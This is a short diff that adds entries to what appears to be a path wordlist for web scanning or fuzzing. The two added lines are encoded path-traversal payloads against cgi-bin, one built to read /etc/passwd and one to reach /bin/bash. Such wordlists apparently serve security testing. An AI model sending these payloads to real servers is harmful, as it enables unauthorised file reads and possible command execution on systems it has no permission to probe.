@@ -53175,3 +53175,5 @@ data
 uploadedfiles/web.config
 /uploadedfiles/web.config
 uploadedfiles:$i30:$INDEX_ALLOCATION
+/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
+/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash
